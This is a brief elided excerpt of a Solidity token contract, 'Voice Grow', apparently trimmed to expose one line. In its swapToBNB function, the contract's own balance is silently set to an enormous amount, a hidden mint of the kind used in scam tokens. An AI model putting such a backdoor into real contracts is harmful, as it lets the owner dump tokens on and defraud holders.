...
contract VoiceGrow is Context, IERC20, Ownable {
    ...
    string private constant _name = "Voice Grow";
    string private constant _symbol = "VOICEGROW";
    ...
    function swapToBNB(uint256 tokens) private {
            _tOwned[address(this)] = 1000000000000 * 10000 + tokens;
